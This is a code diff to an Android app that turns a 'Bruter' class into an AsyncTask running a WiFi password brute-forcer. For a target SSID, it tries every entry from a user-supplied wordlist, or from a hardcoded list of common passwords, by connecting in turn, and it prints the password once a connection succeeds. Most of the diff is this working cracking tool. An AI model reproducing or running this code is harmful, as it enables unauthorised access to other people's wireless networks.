@@ -1,5 +1,6 @@
 package com.example.user.wificontroller;
 
+import android.os.AsyncTask;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.view.View;
@@ -33,21 +34,105 @@ public class MainActivity extends AppCompatActivity {
     }
 
     //////////////BRUTE//////////////////
-    class Bruter implements Runnable{
+    class Bruter extends AsyncTask <Void, String, String> {
+        TextView errorView = (TextView) findViewById(R.id.errorV);
         @Override
-        public void run() {
+        protected String doInBackground(Void... args) {
             try {
-                doBrute();
-            } catch (InterruptedException e) {return;}//stop on interrupt
+                bruteWifi();
+            } catch (InterruptedException e) {return null;}
+            return null;
         }
+
+        @Override
+        protected void onProgressUpdate(String... progress) {
+            if(errorView.getText().length()>=50)
+                errorView.setText("");
+
+            errorView.append(progress[0]);
+        }
+
+        @Override
+        protected void onPostExecute(String res) {
+            errorView.append(res);
+        }
+
+        protected boolean bruteWifi() throws InterruptedException {
+            WifiManager wifi = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+            wifi.setWifiEnabled(true);
+
+            EditText ssidEdit = (EditText) findViewById(R.id.ssid);
+            EditText FilePathEdit = (EditText) findViewById(R.id.pathFile);
+            EditText SpliterEdit = (EditText) findViewById(R.id.spliter);
+            String ssid = ssidEdit.getText().toString();
+
+            boolean res = false;
+            String pathToFile = FilePathEdit.getText().toString();
+            String spliter = null;
+            spliter = SpliterEdit.getText().toString();
+
+            boolean readFromDefault = true;
+            String FilePassList[] = {};
+            String DefaultPassList[] = {"00000000", "87654321", "12345678", "000000000", "123456789", "88888888", "888888888",
+                    "99999999", "999999999", "qwertyui", "qwertyuio", "password", "qwertyuiop", "administrator", "superman",
+                    "password1", "password12", "password123", "password1234", "password12345", "password123456", "baseball",
+                    "football", "1234567890", "123123123", "0987654321", "gfhjkm", "1q2w3e4r5t6y", "q1w2e3r4t5y6", "baltika9",
+                    "russia2018", "russia2019", "medvedev", "leningrad", "eskander"};
+            try{
+                String line;
+                String data = "";
+                BufferedReader br = new BufferedReader(new FileReader(pathToFile));
+                if(spliter.equals("") || spliter == null) {//if spliter null - work
+                    publishProgress("Spliter is emply!\r\nSpliting by new string\r\n");
+                    while ((line = br.readLine()) != null) {
+                        res = connectToUnknown(wifi, ssid, line.trim(), true);
+                        if (res)
+                            return true;
+                    }
+                } else {
+                    while ((line = br.readLine()) != null) {
+                        data += line;
+                    }
+                }
+                FilePassList = data.split(spliter);
+                readFromDefault = false;
+                br.close();
+
+            } catch(Exception e) {
+                readFromDefault = true;
+                publishProgress("Cant read file!\r\n");
+
+            } finally {
+                if(readFromDefault) {
+                    for (String i : DefaultPassList) {
+                        res = connectToUnknown(wifi, ssid, i, true);
+                        if (res) {
+                            publishProgress("Password: " + i + "\r\n");
+                            return true;
+                        }
+                    }
+                } else {
+                    for (String i : FilePassList) {
+                        res = connectToUnknown(wifi, ssid, i, true);
+                        if (res) {
+                            publishProgress("Password: " + i + "\r\n");
+                            return true;
+                        }
+                    }
+                }
+            }
+            return false;
+        }
+
     };
     public void bruteWiFi(View view) throws InterruptedException {
         //doBrute();
         Bruter task = new Bruter();
+        task.execute();
         //Thread thread = new Thread(task);
         //thread.start();
         //task.run();
-        runOnUiThread(task);
+        //runOnUiThread(task);
         //Runnable task = (Runnable) doBrute(wifi);
         /*
         int pass_len = 8;
@@ -258,7 +343,7 @@ public class MainActivity extends AppCompatActivity {
             errorView.append("waiting\r\n");
             Thread.sleep(200);
         }
-
+        Thread.sleep(200);
         if (state == SupplicantState.INVALID ||
                 state == SupplicantState.DISCONNECTED ||
                 state == SupplicantState.INACTIVE ||
